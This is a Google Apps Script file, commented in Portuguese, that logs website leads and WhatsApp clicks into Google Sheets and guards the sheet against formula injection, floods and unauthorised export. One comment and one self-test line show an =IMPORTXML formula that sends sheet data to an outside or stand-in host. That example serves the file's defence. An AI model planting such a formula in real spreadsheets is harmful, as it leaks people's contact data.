/**
 * CRONEX — captura de leads do formulário do site.
 *
 * Aba "Leads":           um registro por envio do formulário (histórico completo).
 * Aba "Contatos":        uma linha por pessoa, deduplicada por telefone (ou e-mail),
 *                        com ID fixo CRX-0001, primeiro/último contato e quantas
 *                        vezes a pessoa procurou.
 * Aba "Cliques WhatsApp": um registro por clique no link "WhatsApp rápido" do site
 *                        (data/hora, página e dispositivo — sem nome nem telefone).
 *
 * O site (js/main.js) faz POST application/x-www-form-urlencoded para /exec:
 *  - formulário: sem 'tipo'  -> Leads + Contatos
 *  - clique wpp: tipo=clique_wpp -> Cliques WhatsApp
 *
 * Instalação e deploy: ver README.md, seção "Planilha de leads".
 */

var ABA_LEADS = 'Leads';
var ABA_CONTATOS = 'Contatos';
var ABA_CLIQUES = 'Cliques WhatsApp';

var COLUNAS_LEADS = [
  'recebido_em', 'data_cliente', 'nome', 'empresa', 'telefone',
  'email', 'segmento', 'pacote', 'mensagem', 'origem'
];

var COLUNAS_CONTATOS = [
  'id', 'nome', 'empresa', 'telefone', 'email', 'segmento',
  'pacote_interesse', 'primeiro_contato', 'ultimo_contato', 'qtd_contatos', 'origem'
];

var COLUNAS_CLIQUES = ['data_hora', 'data_cliente', 'botao', 'pagina', 'dispositivo'];

var PREFIXO_ID = 'CRX-';

/* =========================================================
   Proteção da escrita

   Este Web App é público: a URL está no JavaScript do site, e qualquer pessoa
   pode fazer POST para ela. Três camadas, em ordem de importância:

   1. texto_()   — o Sheets trata valor que começa com "=" como FÓRMULA. Sem
                   isto, alguém envia =IMPORTXML("http://servidor-dele/?d="&A2)
                   no campo nome e, quando você abre a planilha, o Google
                   executa e entrega a base de contatos para ele. É a camada
                   que realmente importa: vale mesmo contra quem tem a chave.
   2. limitado_() — teto de gravações por remetente e no total, para que um
                   laço de script não encha a planilha nem estoure a cota.
   3. SEGREDO_ENVIO — filtro simples. NÃO é autenticação: a chave viaja no
                   JavaScript do site e é visível no navegador. Só serve para
                   afastar quem chega pela URL solta, sem ler o site.
   ========================================================= */

/* =========================================================
   Onde ficam os segredos

   Os dois valores abaixo vivem nas PROPRIEDADES DO SCRIPT, não no código:
   Configurações do projeto → Propriedades do script → Adicionar propriedade.

   O motivo é prático. Enquanto o segredo morava numa linha deste arquivo,
   colar uma versão nova por cima apagava o valor e derrubava a exportação em
   silêncio — o sistema de gestão simplesmente parava de importar leads e
   ninguém ficava sabendo. Fora das Propriedades, o arquivo pode ser colado,
   versionado e compartilhado sem carregar segredo nenhum.

   | Propriedade         | Para que serve                                    |
   |---------------------|---------------------------------------------------|
   | SEGREDO_EXPORTACAO  | libera ?acao=exportar. O MESMO valor vai no        |
   |                     | sistema, em Configurações → Planilhas.            |
   | SEGREDO_ENVIO       | filtro do formulário. O MESMO valor vai em         |
   |                     | cronex-site/js/main.js (CONTATO.chave).           |

   Vazias, as duas falham do lado seguro: exportação desligada, e o filtro do
   formulário simplesmente não roda (texto_ e limitado_ seguem valendo).
   ========================================================= */
function segredo_(nome) {
  try {
    return String(PropertiesService.getScriptProperties().getProperty(nome) || '').trim();
  } catch (err) {
    return '';
  }
}

var LIMITE_POR_REMETENTE = 5;    // envios do mesmo telefone/e-mail
var LIMITE_TOTAL = 100;          // envios de todo mundo somados
var JANELA_S = 600;              // ambos por janela de 10 minutos

/**
 * Neutraliza injeção de fórmula. O apóstrofo à esquerda faz o Sheets guardar
 * o valor como texto — ele não aparece na célula nem na exportação.
 */
function texto_(v) {
  var s = String(v == null ? '' : v).slice(0, 500);
  return /^[=+\-@\t\r]/.test(s) ? "'" + s : s;
}

/** Já passou do teto nesta janela? Conta e responde. */
function limitado_(chave) {
  try {
    var cache = CacheService.getScriptCache();
    var total = Number(cache.get('_total') || 0);
    if (total >= LIMITE_TOTAL) return true;
    cache.put('_total', String(total + 1), JANELA_S);

    var k = 'r_' + String(chave).replace(/\W/g, '').slice(0, 40);
    var n = Number(cache.get(k) || 0);
    if (n >= LIMITE_POR_REMETENTE) return true;
    cache.put(k, String(n + 1), JANELA_S);
    return false;
  } catch (err) {
    return false;   // cache indisponível não pode derrubar a captação
  }
}

function doPost(e) {
  var lock = LockService.getScriptLock();
  lock.tryLock(15000); // evita corrida entre dois envios simultâneos
  try {
    var p = (e && e.parameter) ? e.parameter : {};

    // recusa em silêncio: responder "bloqueado" só ensina o atacante a ajustar
    var chaveEsperada = segredo_('SEGREDO_ENVIO');
    if (chaveEsperada && p.chave !== chaveEsperada) return json_({ ok: true });
    if (limitado_(p.telefone || p.email || p.pagina || 'anon')) return json_({ ok: true });

    var quando = new Date();
    if (p.tipo === 'clique_wpp') {
      registrarClique_(p, quando);
    } else {
      registrarLead_(p, quando);
      atualizarContato_(p, quando);
    }
    return json_({ ok: true });
  } catch (err) {
    // a mensagem interna do Apps Script não vai para quem chamou
    console.error('doPost falhou: ' + err);
    return json_({ ok: false });
  } finally {
    lock.releaseLock();
  }
}

/**
 * GET sem parâmetros: só confirma que o Web App está no ar.
 * GET ?acao=exportar&segredo=XXX: devolve a aba Leads em JSON, para o sistema
 * de gestão importar (ver README, seção "Exportar para o sistema").
 *
 * O segredo é obrigatório na exportação — sem ele, qualquer pessoa com a URL
 * leria a base de leads inteira. Fica na propriedade do script
 * SEGREDO_EXPORTACAO (ver o bloco "Onde ficam os segredos" no topo), e o
 * mesmo valor vai no sistema, em Configurações → Planilhas.
 */
function doGet(e) {
  var p = (e && e.parameter) ? e.parameter : {};

  if (p.acao !== 'exportar') {
    return json_({ ok: true, servico: 'CRONEX leads', hora: new Date().toISOString() });
  }
  var esperado = segredo_('SEGREDO_EXPORTACAO');
  if (!esperado) {
    return json_({ erro: 'exportacao desativada: defina a propriedade do script SEGREDO_EXPORTACAO' });
  }
  if (p.segredo !== esperado) {
    Utilities.sleep(1000);                 // encarece tentativa de adivinhar
    return json_({ erro: 'segredo invalido' });
  }
  return json_(exportarLeads_());
}

/** Lê a aba Leads e devolve uma lista de objetos {coluna: valor}. */
function exportarLeads_() {
  var aba = SpreadsheetApp.getActiveSpreadsheet().getSheetByName(ABA_LEADS);
  if (!aba || aba.getLastRow() < 2) return [];

  var faixa = aba.getRange(1, 1, aba.getLastRow(), aba.getLastColumn()).getDisplayValues();
  var cabecalho = faixa[0].map(function (c) { return String(c).trim(); });
  var saida = [];

  for (var i = 1; i < faixa.length; i++) {
    var linha = {}, vazia = true;
    for (var j = 0; j < cabecalho.length; j++) {
      if (!cabecalho[j]) continue;
      var v = faixa[i][j];
      linha[cabecalho[j]] = v;
      if (String(v).trim() !== '') vazia = false;
    }
    if (!vazia) saida.push(linha);
  }
  return saida;
}

/* ---------- aba Leads: histórico, uma linha por envio ---------- */
function registrarLead_(p, quando) {
  var aba = obterAba_(ABA_LEADS, COLUNAS_LEADS);
  // texto_() em TODO campo vindo de fora: um só esquecido reabre a porta
  aba.appendRow([
    quando, texto_(p.data), texto_(p.nome), texto_(p.empresa), texto_(p.telefone),
    texto_(p.email), texto_(p.segmento), texto_(p.pacote), texto_(p.mensagem), texto_(p.origem)
  ]);
}

/* ---------- aba Cliques WhatsApp: um registro por clique ---------- */
function registrarClique_(p, quando) {
  var aba = obterAba_(ABA_CLIQUES, COLUNAS_CLIQUES);
  aba.appendRow([quando, texto_(p.data), texto_(p.botao), texto_(p.pagina), texto_(p.dispositivo)]);
}

/* ---------- aba Contatos: uma linha por pessoa ---------- */
function atualizarContato_(p, quando) {
  var chave = soDigitos_(p.telefone) || String(p.email || '').trim().toLowerCase();
  if (!chave) return; // sem telefone nem e-mail não há como deduplicar

  var aba = obterAba_(ABA_CONTATOS, COLUNAS_CONTATOS);
  var dados = aba.getDataRange().getValues(); // linha 0 = cabeçalho
  var linhaAlvo = -1;
  var maiorNumero = 0;

  for (var i = 1; i < dados.length; i++) {
    var num = numeroDoId_(dados[i][0]);
    if (num > maiorNumero) maiorNumero = num;
    var chaveLinha = soDigitos_(dados[i][3]) || String(dados[i][4] || '').trim().toLowerCase();
    if (chaveLinha && chaveLinha === chave) linhaAlvo = i + 1; // 1-based
  }

  if (linhaAlvo === -1) {
    var id = PREFIXO_ID + ('0000' + (maiorNumero + 1)).slice(-4);
    aba.appendRow([
      id, texto_(p.nome), texto_(p.empresa), texto_(p.telefone), texto_(p.email),
      texto_(p.segmento), texto_(p.pacote), quando, quando, 1, texto_(p.origem)
    ]);
  } else {
    var atual = aba.getRange(linhaAlvo, 1, 1, COLUNAS_CONTATOS.length).getValues()[0];
    var novo = atual.slice();
    if (p.nome)     novo[1] = texto_(p.nome);
    if (p.empresa)  novo[2] = texto_(p.empresa);
    if (p.telefone) novo[3] = texto_(p.telefone);
    if (p.email)    novo[4] = texto_(p.email);
    if (p.segmento) novo[5] = texto_(p.segmento);
    if (p.pacote)   novo[6] = texto_(p.pacote);
    // novo[7] (primeiro_contato) permanece
    novo[8] = quando;                        // ultimo_contato
    novo[9] = (Number(atual[9]) || 0) + 1;   // qtd_contatos
    aba.getRange(linhaAlvo, 1, 1, COLUNAS_CONTATOS.length).setValues([novo]);
  }
}

/**
 * Recria a aba "Contatos" a partir de TODO o histórico da aba "Leads".
 * Uso único, para o setup inicial (ou se a aba se perder). Reatribui os IDs.
 * Rodar pelo editor: selecionar "reconstruirContatos" e clicar em Executar.
 */
function reconstruirContatos() {
  var ss = SpreadsheetApp.getActiveSpreadsheet();
  var leads = ss.getSheetByName(ABA_LEADS);
  if (!leads) return;

  var antiga = ss.getSheetByName(ABA_CONTATOS);
  if (antiga) ss.deleteSheet(antiga);
  obterAba_(ABA_CONTATOS, COLUNAS_CONTATOS);

  var dados = leads.getDataRange().getValues();
  for (var i = 1; i < dados.length; i++) {
    var l = dados[i]; // recebido_em, data_cliente, nome, empresa, telefone, email, segmento, pacote, mensagem, origem
    atualizarContato_(
      { nome: l[2], empresa: l[3], telefone: l[4], email: l[5], segmento: l[6], pacote: l[7], origem: l[9] },
      l[0] || new Date()
    );
  }
}

/**
 * Varre as três abas procurando célula que o Sheets esteja tratando como
 * fórmula. Depois de ligar o texto_(), rode UMA VEZ pelo editor para conferir
 * o que já estava gravado antes: selecionar "procurarFormulas" → Executar, e
 * ler o resultado em Execuções.
 *
 * Toda fórmula encontrada em coluna de dado do cliente é suspeita — nenhuma
 * das colunas deveria conter uma. Se aparecer alguma, trate como incidente:
 * apague a célula, veja para onde ela apontava e assuma que o conteúdo da
 * planilha pode ter vazado.
 */
function procurarFormulas() {
  var ss = SpreadsheetApp.getActiveSpreadsheet();
  var achados = [];

  [ABA_LEADS, ABA_CONTATOS, ABA_CLIQUES].forEach(function (nome) {
    var aba = ss.getSheetByName(nome);
    if (!aba || aba.getLastRow() < 2) return;
    var f = aba.getRange(1, 1, aba.getLastRow(), aba.getLastColumn()).getFormulas();
    for (var i = 0; i < f.length; i++) {
      for (var j = 0; j < f[i].length; j++) {
        if (f[i][j]) {
          achados.push(nome + ' linha ' + (i + 1) + ' coluna ' + (j + 1) + ': ' + f[i][j]);
        }
      }
    }
  });

  var msg = achados.length
    ? 'ATENÇÃO — ' + achados.length + ' fórmula(s) encontrada(s):\n' + achados.join('\n')
    : 'Nenhuma fórmula nas abas de dados. Planilha limpa.';
  console.log(msg);
  return msg;
}

/**
 * Conferência pós-instalação. Rode pelo editor ANTES de implantar:
 * selecionar "conferirInstalacao" → Executar → ler em Execuções.
 *
 * Diz se as propriedades estão no lugar e prova que a neutralização de
 * fórmula funciona, sem gravar nada na planilha.
 */
function conferirInstalacao() {
  var exportacao = segredo_('SEGREDO_EXPORTACAO');
  var envio = segredo_('SEGREDO_ENVIO');

  var amostra = '=IMPORTXML("https://exemplo.invalido/?d="&A2,"//a")';
  var protegido = texto_(amostra).charAt(0) === "'";

  var linhas = [
    'SEGREDO_EXPORTACAO: ' + (exportacao
      ? 'definido (' + exportacao.length + ' caracteres) — exportação de leads LIGADA'
      : 'VAZIO — a exportação está desligada e o sistema de gestão NÃO vai importar leads'),
    'SEGREDO_ENVIO: ' + (envio
      ? 'definido (' + envio.length + ' caracteres) — o site precisa mandar a MESMA chave em CONTATO.chave, senão o formulário para de gravar'
      : 'vazio — filtro desligado (tudo bem; texto_ e limitado_ seguem valendo)'),
    'Neutralização de fórmula: ' + (protegido ? 'FUNCIONANDO' : 'FALHOU — não implante'),
    'Limites: ' + LIMITE_POR_REMETENTE + ' por remetente e ' + LIMITE_TOTAL +
      ' no total, a cada ' + (JANELA_S / 60) + ' minutos'
  ];

  var msg = linhas.join('\n');
  console.log(msg);
  return msg;
}

/* ---------- utilitários ---------- */
function obterAba_(nome, colunas) {
  var ss = SpreadsheetApp.getActiveSpreadsheet();
  var aba = ss.getSheetByName(nome) || ss.insertSheet(nome);
  if (aba.getLastRow() === 0) {
    aba.appendRow(colunas);
    aba.setFrozenRows(1);
    aba.getRange(1, 1, 1, colunas.length).setFontWeight('bold');
  }
  return aba;
}

function soDigitos_(v) {
  return String(v == null ? '' : v).replace(/\D/g, '');
}

function numeroDoId_(id) {
  var m = String(id || '').match(/(\d+)\s*$/);
  return m ? parseInt(m[1], 10) : 0;
}

function json_(obj) {
  return ContentService
    .createTextOutput(JSON.stringify(obj))
    .setMimeType(ContentService.MimeType.JSON);
}
